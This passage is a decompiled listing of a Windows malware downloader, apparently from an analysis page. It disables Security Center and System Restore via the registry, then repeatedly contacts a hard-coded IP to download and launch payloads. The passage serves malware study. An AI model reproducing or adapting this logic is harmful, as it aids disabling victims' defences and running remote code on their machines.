        </span>RegSetValueExW<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">, (&amp;</span><span style="color:#8080ff">v32</span><span style="color:navy">)[</span><span style="color:#8080ff">j</span><span style="color:navy">], </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">4u</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v41</span><span style="color:navy">, </span><span style="color:#00aa00">4u</span><span style="color:navy">);
    </span><span style="background:navy"></span><span style="color:navy">}
    </span>RegCloseKey<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">);
  </span><span style="background:navy"></span><span style="color:navy">}
  </span><span style="color:#00aa00">if </span><span style="color:navy">( !</span>RegOpenKeyExW<span style="color:navy">(</span>HKEY_LOCAL_MACHINE<span style="color:navy">, </span>aSoftwareMicros_2<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0xF003Fu</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v25</span><span style="color:navy">) )
  {                                             </span><span style="color:green">// SOFTWARE\Microsoft\Security Center\Svc\
    </span><span style="color:#00aa00">for </span><span style="color:navy">( </span><span style="color:#8080ff">k </span><span style="color:navy">= </span><span style="color:#00aa00">0</span><span style="color:navy">; </span><span style="color:#8080ff">k &lt; </span><span style="color:#00aa00">7</span><span style="color:navy">; ++</span><span style="color:#8080ff">k </span><span style="color:navy">)
    {
      </span><span style="color:#8080ff">v39 </span><span style="color:navy">= </span>RegQueryValueExW<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">, (&amp;</span><span style="color:#8080ff">v32</span><span style="color:navy">)[</span><span style="color:#8080ff">k</span><span style="color:navy">], </span><span style="color:#00aa00">0</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v40</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">);
      </span><span style="color:#00aa00">if </span><span style="color:navy">( </span><span style="color:#8080ff">v39 </span><span style="color:navy">)
        </span>RegSetValueExW<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">, (&amp;</span><span style="color:#8080ff">v32</span><span style="color:navy">)[</span><span style="color:#8080ff">k</span><span style="color:navy">], </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">4u</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v41</span><span style="color:navy">, </span><span style="color:#00aa00">4u</span><span style="color:navy">);
    </span><span style="background:navy"></span><span style="color:navy">}
    </span>RegCloseKey<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">);
  </span><span style="background:navy"></span><span style="color:navy">}
  </span><span style="color:#00aa00">if </span><span style="color:navy">( !</span>RegOpenKeyExW<span style="color:navy">(</span>HKEY_LOCAL_MACHINE<span style="color:navy">, </span>aSoftwareMicros_3<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0xF003Fu</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v25</span><span style="color:navy">) )
  {                                             </span><span style="color:green">// SOFTWARE\Microsoft\Windows NT\CurrentVersion\System Restore\
    </span><span style="color:#8080ff">v39 </span><span style="color:navy">= </span>RegQueryValueExW<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">, </span>aDisablesr<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v40</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">);
    </span><span style="color:#00aa00">if </span><span style="color:navy">( </span><span style="color:#8080ff">v39 </span><span style="color:navy">)
      </span>RegSetValueExW<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">, </span>aDisablesr_0<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">4u</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v41</span><span style="color:navy">, </span><span style="color:#00aa00">4u</span><span style="color:navy">);</span><span style="color:green">// DisableSR
    </span>RegCloseKey<span style="color:navy">(</span><span style="color:#8080ff">v25</span><span style="color:navy">);
  </span><span style="background:navy"></span><span style="color:navy">}
  </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">0x1F4u</span><span style="color:navy">);
  </span><span style="color:#00aa00">while </span><span style="color:navy">( </span><span style="color:#00aa00">1 </span><span style="color:navy">)
  {
    </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">0x1F4u</span><span style="color:navy">);
    </span><span style="color:#00aa00">for </span><span style="color:navy">( </span><span style="color:#8080ff">l </span><span style="color:navy">= </span><span style="color:#00aa00">0</span><span style="color:navy">; </span><span style="color:#8080ff">l &lt; </span><span style="color:#00aa00">2</span><span style="color:navy">; ++</span><span style="color:#8080ff">l </span><span style="color:navy">)
    {
      </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">0x1F4u</span><span style="color:navy">);
      </span>j_memset<span style="color:navy">(&amp;</span><span style="color:#8080ff">v16</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">500</span><span style="color:navy">);
      </span>j_snprintf<span style="color:navy">(&amp;</span><span style="color:#8080ff">v16</span><span style="color:navy">, </span><span style="color:#00aa00">500</span><span style="color:navy">, </span>aS<span style="color:navy">, (&amp;</span><span style="color:#8080ff">str_92_63_197_153</span><span style="color:navy">)[</span><span style="color:#8080ff">l</span><span style="color:navy">]);
      </span><span style="color:#00aa00">for </span><span style="color:navy">( </span><span style="color:#8080ff">m </span><span style="color:navy">= </span><span style="color:#00aa00">0</span><span style="color:navy">; </span><span style="color:#8080ff">m &lt; </span><span style="color:#00aa00">5</span><span style="color:navy">; ++</span><span style="color:#8080ff">m </span><span style="color:navy">)
      {
        </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">0x1F4u</span><span style="color:navy">);
        </span>j_memset<span style="color:navy">(&amp;</span><span style="color:#8080ff">v1</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">500</span><span style="color:navy">);
        </span>j_snprintf<span style="color:navy">(&amp;</span><span style="color:#8080ff">v1</span><span style="color:navy">, </span><span style="color:#00aa00">500</span><span style="color:navy">, </span>aSS<span style="color:navy">, &amp;</span><span style="color:#8080ff">v16</span><span style="color:navy">, (&amp;</span><span style="color:#8080ff">v18</span><span style="color:navy">)[</span><span style="color:#8080ff">m</span><span style="color:navy">]);
        </span><span style="color:#00aa00">if </span><span style="color:navy">( </span><a href="My_InternetConnect.html">My_InternetConnect</a><span style="color:navy">(&amp;</span><span style="color:#8080ff">v1</span><span style="color:navy">) )
          </span>CreateThread<span style="color:navy">(</span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><a href="My_InternetDown_CreateProc.html">My_InternetDown_CreateProc</a><span style="color:navy">, &amp;</span><span style="color:#8080ff">v1</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">);
      </span><span style="background:navy"></span><span style="color:navy">}
    </span><span style="background:blue"></span><span style="color:navy">}
    </span><span style="color:#8080ff">v0 </span><span style="color:navy">= </span>j_rand<span style="color:navy">();
    </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">5 </span><span style="color:navy">* (</span><span style="color:#8080ff">v0 </span><span style="color:navy">% </span><span style="color:#00aa00">60000</span><span style="color:navy">) + </span><span style="color:#00aa00">10000</span><span style="color:navy">);
  </span><span style="background:navy"></span><span style="color:navy">}
</span><span style="background:blue"></span><span style="color:navy">}
</span></body></html>
